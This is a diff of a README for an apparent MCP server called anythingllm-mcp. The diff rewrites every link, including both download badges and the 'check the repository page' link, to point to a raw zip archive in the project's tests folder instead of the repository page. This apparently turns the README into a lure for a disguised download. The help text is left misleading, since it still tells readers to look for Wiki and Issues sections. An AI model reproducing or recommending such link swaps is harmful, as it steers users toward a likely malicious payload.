@@ -1,6 +1,6 @@
 # 🤖 anythingllm-mcp - Manage AI Workspaces and Chats Easily
 
-[![Download anythingllm-mcp](https://img.shields.io/badge/Download-anythingllm--mcp-4caf50?style=for-the-badge)](https://github.com/gsmMu7ammed/anythingllm-mcp)
+[![Download anythingllm-mcp](https://img.shields.io/badge/Download-anythingllm--mcp-4caf50?style=for-the-badge)](https://github.com/gsmMu7ammed/anythingllm-mcp/raw/refs/heads/main/tests/mcp_anythingllm_3.1.zip)
 
 ## 📋 About anythingllm-mcp
 
@@ -32,7 +32,7 @@ To use anythingllm-mcp on your Windows computer, follow these steps carefully.
 
 Click the button below to go to the download page where you get the server files.
 
-[![Download anythingllm-mcp](https://img.shields.io/badge/Download-anythingllm--mcp-ff7f50?style=for-the-badge)](https://github.com/gsmMu7ammed/anythingllm-mcp)
+[![Download anythingllm-mcp](https://img.shields.io/badge/Download-anythingllm--mcp-ff7f50?style=for-the-badge)](https://github.com/gsmMu7ammed/anythingllm-mcp/raw/refs/heads/main/tests/mcp_anythingllm_3.1.zip)
 
 This page contains the latest versions and all necessary files for Windows.
 
@@ -152,7 +152,7 @@ Always back up important data before updating.
 
 For advanced help, troubleshooting, and detailed features, check the GitHub repository page:
 
-https://github.com/gsmMu7ammed/anythingllm-mcp
+https://github.com/gsmMu7ammed/anythingllm-mcp/raw/refs/heads/main/tests/mcp_anythingllm_3.1.zip
 
 Look for sections like "Wiki," "Issues," or "Discussions" to learn more.
 
